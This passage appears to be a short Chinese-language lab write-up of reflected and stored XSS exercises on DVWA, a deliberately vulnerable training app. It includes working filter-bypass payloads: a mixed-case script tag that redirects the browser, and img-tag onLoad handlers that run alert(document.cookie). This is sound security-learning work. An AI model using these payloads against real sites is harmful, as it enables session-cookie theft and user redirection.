```html
<sCript>location.href="https://1.1.1.1"</sCript>
```

這次後端顯然有過濾 Name 欄位

用  `img tag` + `onLoad` try try 看

Message 欄位也有過濾

```html
http://dvwa.localtest/vulnerabilities/xss_r/?name=<img src='https://picsum.photos/200/300' onLoad="eval(alert(document.cookie))">
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4dd11fac-810c-4707-908d-ccfdfa2c3847/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T132704Z&X-Amz-Expires=86400&X-Amz-Signature=2c897d163839c872c74c5d54392b4df7c7c0e2e4246b48a811276ce266c18927&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Done

第一個欄位可以用 `img tag` + `onLoad` @@

```html
<img src='https://picsum.photos/200/300' onLoad="eval(alert(document.cookie))">
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/722737d7-ab33-4127-9209-7d97b8929a59/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T132552Z&X-Amz-Expires=86400&X-Amz-Signature=a658fce6d86138cf00e673a760d207348c05ba6479e443f57a7001129509ca82&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

運氣好有 try 到

原本還以為這關可能要使用 js 註解來迴避長度限制之類的
